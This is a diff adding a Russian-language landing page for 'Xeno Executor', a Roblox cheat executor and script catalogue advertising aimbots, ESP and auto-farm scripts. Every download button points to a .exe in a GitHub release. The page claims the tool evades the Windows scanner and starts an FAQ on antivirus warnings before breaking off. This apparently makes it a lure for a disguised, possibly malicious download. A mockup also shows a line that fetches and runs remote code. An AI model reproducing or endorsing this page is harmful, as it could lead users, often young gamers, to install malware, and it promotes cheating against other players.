@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Xeno Executor — Продвинутая среда запуска скриптов Roblox</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cabinet+Grotesk:wght@700;800;900&family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Header / Navigation -->
+  <header class="header">
+    <div class="container header-container">
+      <a href="#" class="logo">
+        <span class="logo-mark">X</span>
+        <span class="logo-text">XENO</span>
+      </a>
+
+      <nav class="nav-links">
+        <a href="#features" data-i18n="nav_features">Возможности</a>
+        <a href="#games" data-i18n="nav_games">Игры и скрипты</a>
+        <a href="#benchmarks" data-i18n="nav_benchmarks">Тесты sUNC</a>
+        <a href="#faq" data-i18n="nav_faq">FAQ</a>
+        <a href="#agreement" data-i18n="nav_agreement">Соглашение</a>
+      </nav>
+
+      <div class="header-actions">
+        <button class="lang-switch" id="langSwitch" type="button" aria-label="Смена языка">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"></circle>
+            <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path>
+            <path d="M2 12h20"></path>
+          </svg>
+          <span id="langLabel">Русский</span>
+        </button>
+
+        <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-primary btn-sm download-link" data-i18n="btn_download">
+          <span>Скачать</span>
+        </a>
+      </div>
+
+      <button class="mobile-menu-toggle" id="menuToggle" aria-label="Открыть меню">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+    </div>
+  </header>
+
+  <!-- Mobile Drawer -->
+  <div class="mobile-drawer" id="mobileDrawer">
+    <div class="mobile-nav">
+      <a href="#features" class="mob-link" data-i18n="nav_features">Возможности</a>
+      <a href="#games" class="mob-link" data-i18n="nav_games">Игры и скрипты</a>
+      <a href="#benchmarks" class="mob-link" data-i18n="nav_benchmarks">Тесты sUNC</a>
+      <a href="#faq" class="mob-link" data-i18n="nav_faq">FAQ</a>
+      <a href="#agreement" class="mob-link" data-i18n="nav_agreement">Соглашение</a>
+      <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-primary download-link" style="margin-top: 1rem;" data-i18n="hero_download_btn">Скачать Xeno v3.4</a>
+    </div>
+  </div>
+
+  <main>
+    <!-- Hero Section -->
+    <section class="hero">
+      <div class="container hero-grid">
+        <div class="hero-content">
+          <div class="hero-badge">
+            <span class="badge-dot"></span>
+            <span data-i18n="hero_badge">Доступно более <strong>1900+ модификаций</strong> • Патч Luau 2026</span>
+          </div>
+
+          <h1 class="hero-title" data-i18n="hero_title">
+            Мы собрали все <span class="highlight">твои любимые скрипты</span> в одном месте
+          </h1>
+
+          <p class="hero-desc" data-i18n="hero_desc">
+            Xeno Executor — сверхбыстрая среда исполнения Luau и каталог готовых модификаций для Roblox. Встроенная библиотека популярных режимов, полная поддержка sUNC 99%, авто-инжект, decompiler и никакого мусора. Искал надежный софт без зависаний и вечных переходов по ссылкам? Считай, что тебе повезло!
+          </p>
+
+          <div class="hero-cta">
+            <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-primary btn-lg download-link">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                <polyline points="7 10 12 15 17 10"></polyline>
+                <line x1="12" y1="15" x2="12" y2="3"></line>
+              </svg>
+              <span data-i18n="hero_download_btn">Скачать Xeno v3.4</span>
+            </a>
+            <a href="#games" class="btn btn-secondary btn-lg" data-i18n="hero_catalog_btn">
+              <span>Каталог скриптов</span>
+            </a>
+          </div>
+
+          <p class="hero-footnote" data-i18n="hero_footnote">
+            Это бесплатно. Мы поддерживаем Windows 10, Windows 11 (x64 / ARM64). Xeno НЕ требует сторонних ключей каждые 24 часа и оптимизирован под многооконный режим.
+          </p>
+
+          <div class="hero-stats">
+            <div class="stat-item">
+              <div class="stat-value">99.2%</div>
+              <div class="stat-label" data-i18n="stat_sunc">sUNC Совместимость</div>
+            </div>
+            <div class="stat-divider"></div>
+            <div class="stat-item">
+              <div class="stat-value">0.02ms</div>
+              <div class="stat-label" data-i18n="stat_inject">Время инжекта</div>
+            </div>
+            <div class="stat-divider"></div>
+            <div class="stat-item">
+              <div class="stat-value">1903</div>
+              <div class="stat-label" data-i18n="stat_scripts">Скриптов в базе</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3D Perspective UI Mockup (Reference style) -->
+        <div class="hero-preview-wrapper">
+          <div class="isometric-canvas">
+            <div class="glow-backdrop"></div>
+            <div class="accent-layer-blue"></div>
+            <div class="accent-layer-cyan"></div>
+
+            <div class="mockup-window">
+              <!-- Window title bar with spacious layout -->
+              <div class="window-header">
+                <div class="window-dots">
+                  <span class="dot dot-red"></span>
+                  <span class="dot dot-yellow"></span>
+                  <span class="dot dot-green"></span>
+                </div>
+                <div class="window-title">Xeno Suite v3.4 — Luau VM</div>
+                <div class="window-status">
+                  <span class="pulse-indicator"></span>
+                  <span>Roblox: Attached</span>
+                </div>
+              </div>
+
+              <!-- Window Inner Body -->
+              <div class="window-body">
+                <!-- Sidebar -->
+                <div class="window-sidebar">
+                  <div class="side-item active">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+                    <span data-i18n="mock_scripts">Скрипты</span>
+                  </div>
+                  <div class="side-item">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>
+                    <span data-i18n="mock_editor">Редактор</span>
+                  </div>
+                  <div class="side-item">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
+                    <span>Cloud Hub</span>
+                  </div>
+                  <div class="side-item">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
+                    <span data-i18n="mock_settings">Настройки</span>
+                  </div>
+                </div>
+
+                <!-- Main Content Pane -->
+                <div class="window-main">
+                  <div class="pane-search">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                    <input type="text" placeholder="Поиск по скриптам..." readonly value="Blox Fruits auto-farm, ESP, Silent Aim">
+                    <span class="search-tag" data-i18n="tag_all_modes">Все режимы</span>
+                  </div>
+
+                  <div class="card-grid-mini">
+                    <div class="script-mini-card featured">
+                      <div class="card-badge-top" data-i18n="mock_top_week">Топ недели</div>
+                      <div class="card-title-mini">RedzHub v3.0</div>
+                      <div class="card-sub-mini">Blox Fruits • Auto Farm & Teleport</div>
+                      <div class="card-meta-mini">
+                        <span class="rating">★ 4.9</span>
+                        <span class="status-chip active" data-i18n="mock_working">Работает</span>
+                      </div>
+                    </div>
+
+                    <div class="script-mini-card">
+                      <div class="card-badge-top">Universal</div>
+                      <div class="card-title-mini">Solaris ESP & Aim</div>
+                      <div class="card-sub-mini">Arsenal / Rivals / Da Hood</div>
+                      <div class="card-meta-mini">
+                        <span class="rating">★ 4.8</span>
+                        <span class="status-chip active">UNC 100%</span>
+                      </div>
+                    </div>
+
+                    <div class="script-mini-card">
+                      <div class="card-badge-top">Speed Hub</div>
+                      <div class="card-title-mini">Fisch Godmode</div>
+                      <div class="card-sub-mini">Fisch • Instant Catch & Radar</div>
+                      <div class="card-meta-mini">
+                        <span class="rating">★ 5.0</span>
+                        <span class="status-chip active" data-i18n="mock_updated">Обновлен</span>
+                      </div>
+                    </div>
+
+                    <div class="script-mini-card">
+                      <div class="card-badge-top">Utility</div>
+                      <div class="card-title-mini">Hydrox Decompiler</div>
+                      <div class="card-sub-mini" data-i18n="mock_decomp_sub">Полный дамп байткода Luau</div>
+                      <div class="card-meta-mini">
+                        <span class="rating">★ 4.9</span>
+                        <span class="status-chip active">v2.8</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- Code execution snippet -->
+                  <div class="code-preview-pane">
+                    <div class="code-bar">
+                      <span>main.lua</span>
+                      <button class="code-run-btn">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+                        Execute
+                      </button>
+                    </div>
+                    <pre><code><span class="c-keyword">loadstring</span>(game:<span class="c-func">HttpGet</span>(<span class="c-str">"https://raw.githubusercontent.com/xeno/hub/main.lua"</span>))()
+<span class="c-comment">-- [XENO] 127 functions mapped, sUNC level 8 active, zero overhead</span></code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Supported Games & Mods Section -->
+    <section class="section games-section" id="games">
+      <div class="container">
+        <div class="section-header">
+          <h2 class="section-title" data-i18n="games_title">Поддерживаемые игры и режимы</h2>
+          <p class="section-subtitle" data-i18n="games_subtitle">
+            Выбирай нужный плейс — Xeno автоматически загружает проверенные конфигурации и скрипты прямо в игру.
+          </p>
+        </div>
+
+        <!-- Filter tabs -->
+        <div class="filter-bar">
+          <button class="filter-btn active" data-filter="all" data-i18n="filter_all">Все режимы</button>
+          <button class="filter-btn" data-filter="rpg" data-i18n="filter_rpg">RPG & Гринд</button>
+          <button class="filter-btn" data-filter="shooter" data-i18n="filter_shooter">Шутеры & PvP</button>
+          <button class="filter-btn" data-filter="sim" data-i18n="filter_sim">Симуляторы</button>
+          <button class="filter-btn" data-filter="universal" data-i18n="filter_universal">Универсальные</button>
+        </div>
+
+        <!-- Games Grid with direct download button on each card -->
+        <div class="games-grid" id="gamesGrid">
+          <!-- Card 1: Blox Fruits -->
+          <div class="game-card" data-category="rpg">
+            <div class="game-cover blox-fruits">
+              <span class="game-tag" data-i18n="card_tag_bf">140+ скриптов</span>
+              <div class="game-overlay">
+                <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-sm btn-primary download-link" data-i18n="btn_download_game">
+                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                  </svg>
+                  <span>Скачать</span>
+                </a>
+              </div>
+            </div>
+            <div class="game-info">
+              <h3 class="game-title">Blox Fruits</h3>
+              <p class="game-desc" data-i18n="desc_bf">Авто-фарм мобов, мастерство, рейды, фрукты и быстрый телепорт между морями.</p>
+              <div class="game-meta">
+                <span class="meta-tag">Redz / Hoho / Maru</span>
+                <span class="status-dot online" data-i18n="status_online">Онлайн</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card 2: Rivals -->
+          <div class="game-card" data-category="shooter">
+            <div class="game-cover rivals">
+              <span class="game-tag" data-i18n="card_tag_rivals">85+ скриптов</span>
+              <div class="game-overlay">
+                <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-sm btn-primary download-link" data-i18n="btn_download_game">
+                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                  </svg>
+                  <span>Скачать</span>
+                </a>
+              </div>
+            </div>
+            <div class="game-info">
+              <h3 class="game-title">Rivals</h3>
+              <p class="game-desc" data-i18n="desc_rivals">Silent Aimbot, FOV Circle, Box ESP, Chams, No Recoil и быстрый Triggerbot.</p>
+              <div class="game-meta">
+                <span class="meta-tag">Aether / Solaris</span>
+                <span class="status-dot online" data-i18n="status_online">Онлайн</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card 3: Arsenal -->
+          <div class="game-card" data-category="shooter">
+            <div class="game-cover arsenal">
+              <span class="game-tag" data-i18n="card_tag_arsenal">92 скрипта</span>
+              <div class="game-overlay">
+                <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-sm btn-primary download-link" data-i18n="btn_download_game">
+                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                  </svg>
+                  <span>Скачать</span>
+                </a>
+              </div>
+            </div>
+            <div class="game-info">
+              <h3 class="game-title">Arsenal</h3>
+              <p class="game-desc" data-i18n="desc_arsenal">Бессмертие, Wallbang, кастомный хитбокс, Kill All и автоматическая стрельба.</p>
+              <div class="game-meta">
+                <span class="meta-tag">DarkHub / Thunder</span>
+                <span class="status-dot online" data-i18n="status_online">Онлайн</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card 4: Fisch -->
+          <div class="game-card" data-category="sim">
+            <div class="game-cover fisch">
+              <span class="game-tag" data-i18n="card_tag_fisch">48 скриптов</span>
+              <div class="game-overlay">
+                <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-sm btn-primary download-link" data-i18n="btn_download_game">
+                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                  </svg>
+                  <span>Скачать</span>
+                </a>
+              </div>
+            </div>
+            <div class="game-info">
+              <h3 class="game-title">Fisch</h3>
+              <p class="game-desc" data-i18n="desc_fisch">Мгновенный улов, авто-продажа рыбы, телепорт к редким зонам, ESP на сундуки.</p>
+              <div class="game-meta">
+                <span class="meta-tag">SpeedHub X / Solix</span>
+                <span class="status-dot online" data-i18n="status_online">Онлайн</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card 5: Da Hood -->
+          <div class="game-card" data-category="shooter">
+            <div class="game-cover da-hood">
+              <span class="game-tag" data-i18n="card_tag_dahood">110+ скриптов</span>
+              <div class="game-overlay">
+                <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-sm btn-primary download-link" data-i18n="btn_download_game">
+                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                  </svg>
+                  <span>Скачать</span>
+                </a>
+              </div>
+            </div>
+            <div class="game-info">
+              <h3 class="game-title">Da Hood</h3>
+              <p class="game-desc" data-i18n="desc_dahood">Target Lock, Resolver, Anti-Stomp, Fly, Crash защиты и кастомный графический HUD.</p>
+              <div class="game-meta">
+                <span class="meta-tag">Krypton / Pluto</span>
+                <span class="status-dot online" data-i18n="status_online">Онлайн</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card 6: Pet Simulator 99 -->
+          <div class="game-card" data-category="sim">
+            <div class="game-cover ps99">
+              <span class="game-tag" data-i18n="card_tag_ps99">64 скрипта</span>
+              <div class="game-overlay">
+                <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-sm btn-primary download-link" data-i18n="btn_download_game">
+                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                  </svg>
+                  <span>Скачать</span>
+                </a>
+              </div>
+            </div>
+            <div class="game-info">
+              <h3 class="game-title">Pet Simulator 99</h3>
+              <p class="game-desc" data-i18n="desc_ps99">Фарм алмазов, сбор подарков, авто-открытие яиц без задержек и мини-игры.</p>
+              <div class="game-meta">
+                <span class="meta-tag">ZapHub / Giga</span>
+                <span class="status-dot online" data-i18n="status_online">Онлайн</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card 7: Blade Ball -->
+          <div class="game-card" data-category="rpg">
+            <div class="game-cover blade-ball">
+              <span class="game-tag" data-i18n="card_tag_bladeball">72 скрипта</span>
+              <div class="game-overlay">
+                <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-sm btn-primary download-link" data-i18n="btn_download_game">
+                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                  </svg>
+                  <span>Скачать</span>
+                </a>
+              </div>
+            </div>
+            <div class="game-info">
+              <h3 class="game-title">Blade Ball</h3>
+              <p class="game-desc" data-i18n="desc_bladeball">Безупречный Auto Parry (парирование мяча на любой скорости), Curve prediction и анти-стан.</p>
+              <div class="game-meta">
+                <span class="meta-tag">AutoDeflect / Lunar</span>
+                <span class="status-dot online" data-i18n="status_online">Онлайн</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card 8: Infinite Yield & Dex -->
+          <div class="game-card" data-category="universal">
+            <div class="game-cover universal">
+              <span class="game-tag" data-i18n="card_tag_universal">Все режимы</span>
+              <div class="game-overlay">
+                <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-sm btn-primary download-link" data-i18n="btn_download_game">
+                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                  </svg>
+                  <span>Скачать</span>
+                </a>
+              </div>
+            </div>
+            <div class="game-info">
+              <h3 class="game-title">Infinite Yield & Dex</h3>
+              <p class="game-desc" data-i18n="desc_universal">Главный командный центр: Fly, Noclip, Btools, Dark Dex Explorer и Remote Spy.</p>
+              <div class="game-meta">
+                <span class="meta-tag">IY Admin / Dex v4</span>
+                <span class="status-dot online" data-i18n="status_online">Онлайн</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Key Features Section -->
+    <section class="section features-section" id="features">
+      <div class="container">
+        <div class="section-header text-center">
+          <div class="sub-badge" data-i18n="feat_badge">Архитектура движка</div>
+          <h2 class="section-title" data-i18n="feat_title">Почему комьюнити переходит на Xeno</h2>
+          <p class="section-subtitle" data-i18n="feat_subtitle">
+            Мы переписали пайплайн взаимодействия с процессом с нуля: никакой эмуляции ввода, только нативная Luau виртуальная машина.
+          </p>
+        </div>
+
+        <div class="features-grid">
+          <div class="feature-card">
+            <div class="feature-icon">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+            </div>
+            <h3 class="feature-title" data-i18n="feat_1_title">99% sUNC & Level 8</h3>
+            <p class="feature-text" data-i18n="feat_1_text">
+              Полный спектр кастомных функций: hookmetamethod, clonefunction, getrawmetatable, firesignal, decompile, getgenv. Запустится любой приватный скрипт.
+            </p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            </div>
+            <h3 class="feature-title" data-i18n="feat_2_title">Изоляция памяти и защита</h3>
+            <p class="feature-text" data-i18n="feat_2_text">
+              Чистый инжектор без внедрения подозрительных DLL и сторонних драйверов. Не трогает системные библиотеки и не триггерит встроенный сканер Windows.
+            </p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 14 14"></polyline></svg>
+            </div>
+            <h3 class="feature-title" data-i18n="feat_3_title">Keyless навсегда</h3>
+            <p class="feature-text" data-i18n="feat_3_text">
+              Больше никаких пятиуровневых ссылок, капч и сокращателей ссылок. Один раз скачал — запустил и играешь без ежедневного обновления ключей.
+            </p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+            </div>
+            <h3 class="feature-title" data-i18n="feat_4_title">Многооконный режим</h3>
+            <p class="feature-text" data-i18n="feat_4_text">
+              Автоматическое подключение ко всем запущенным копиям клиента (Multi-Roblox) одновременно с раздельным выполнением скриптов.
+            </p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+            </div>
+            <h3 class="feature-title" data-i18n="feat_5_title">Встроенный Decompiler</h3>
+            <p class="feature-text" data-i18n="feat_5_text">
+              Разбирай чужие LocalScripts и ModuleScripts прямо в памяти за доли секунды с восстановлением переменных и структуры циклов.
+            </p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg>
+            </div>
+            <h3 class="feature-title" data-i18n="feat_6_title">Cloud Script Hub</h3>
+            <p class="feature-text" data-i18n="feat_6_text">
+              Ежедневное обновление базы скриптов через защищенный CDN. Если скрипт сломался после патча игры — апдейт прилетает автоматически.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Interactive Script Executor Preview / Playground -->
+    <section class="section benchmark-section" id="benchmarks">
+      <div class="container">
+        <div class="benchmark-box">
+          <div class="benchmark-info">
+            <span class="sub-badge" data-i18n="bench_badge">Проверка окружения</span>
+            <h2 data-i18n="bench_title">Тест совместимости sUNC и Luau окружения</h2>
+            <p data-i18n="bench_subtitle">
+              Вы можете проверить поддержку стандартных системных функций перед запуском Xeno. Наша виртуальная машина проходит все открытые тесты unc-test.
+            </p>
+
+            <div class="check-list">
+              <div class="check-row">
+                <span class="icon-check">✓</span>
+                <span data-i18n="bench_check_1"><strong>getgenv / getrenv / getreg</strong> — доступ к глобальным таблицам</span>
+              </div>
+              <div class="check-row">
+                <span class="icon-check">✓</span>
+                <span data-i18n="bench_check_2"><strong>hookmetamethod & hookfunction</strong> — подмена хуков движка</span>
+              </div>
+              <div class="check-row">
+                <span class="icon-check">✓</span>
+                <span data-i18n="bench_check_3"><strong>Drawing API v2</strong> — рендер ESP, линий, текста и кругов FOV</span>
+              </div>
+              <div class="check-row">
+                <span class="icon-check">✓</span>
+                <span data-i18n="bench_check_4"><strong>WebSocket / HttpGet / Request</strong> — защищенные внешние сокеты</span>
+              </div>
+            </div>
+
+            <div class="score-card">
+              <div class="score-circle">
+                <span class="score-num">99.2%</span>
+                <span class="score-txt">sUNC PASS</span>
+              </div>
+              <div class="score-details">
+                <div data-i18n="score_ratio"><strong>104 / 105</strong> тестов пройдено</div>
+                <div class="score-bar-bg"><div class="score-bar-fill" style="width: 99.2%;"></div></div>
+                <small data-i18n="score_footer">Официальный UNC Benchmark (последний прогон)</small>
+              </div>
+            </div>
+          </div>
+
+          <div class="terminal-mock">
+            <div class="terminal-bar">
+              <span class="term-dot"></span>
+              <span class="term-dot"></span>
+              <span class="term-dot"></span>
+              <span class="term-title">UNC Evaluation Console</span>
+            </div>
+            <div class="terminal-content" id="terminalContent">
+              <div class="term-line"><span class="t-cyan">[XENO-ENV]</span> Initializing Luau Core v5.1...</div>
+              <div class="term-line"><span class="t-green">[PASS]</span> identifyexecutor() -> "Xeno", "3.4.1"</div>
+              <div class="term-line"><span class="t-green">[PASS]</span> hookmetamethod(__namecall, hook) -> valid</div>
+              <div class="term-line"><span class="t-green">[PASS]</span> getcustomasset() & cache APIs -> ready</div>
+              <div class="term-line"><span class="t-green">[PASS]</span> crypt.base64encode / decode -> OK</div>
+              <div class="term-line"><span class="t-green">[PASS]</span> Drawing.new("Circle") -> 144 FPS Render</div>
+              <div class="term-line"><span class="t-green">[PASS]</span> decompile(ScriptInstance) -> AST built</div>
+              <div class="term-line t-highlight">>>> Summary: 104 Passed, 0 Failed, 1 Skipped.</div>
+              <div class="term-line t-muted">Ready to inject into process: RobloxPlayerBeta.exe</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="section faq-section" id="faq">
+      <div class="container faq-container">
+        <div class="section-header text-center">
+          <div class="sub-badge" data-i18n="faq_badge">Частые вопросы</div>
+          <h2 class="section-title" data-i18n="faq_title">Всё, что нужно знать перед стартом</h2>
+          <p class="section-subtitle" data-i18n="faq_subtitle">Ответы на самые популярные вопросы по установке и использованию Xeno</p>
+        </div>
+
+        <div class="faq-accordion">
+          <div class="faq-item">
+            <button class="faq-question">
+              <span data-i18n="faq_q1">Xeno действительно не требует ключа?</span>
+              <span class="faq-arrow">+</span>
+            </button>
+            <div class="faq-answer">
+              <p data-i18n="faq_a1">Да. Мы отказались от Linkvertise, LootLabs и других систем сбора ключей. Программа запускается напрямую, вы сразу получаете полный доступ ко всем функциям и скриптам.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <span data-i18n="faq_q2">Почему антивирус может предупреждать при скачивании?</span>
+              <span class="faq-arrow">+</span>
+            </button>
+            <div class="faq-answer">
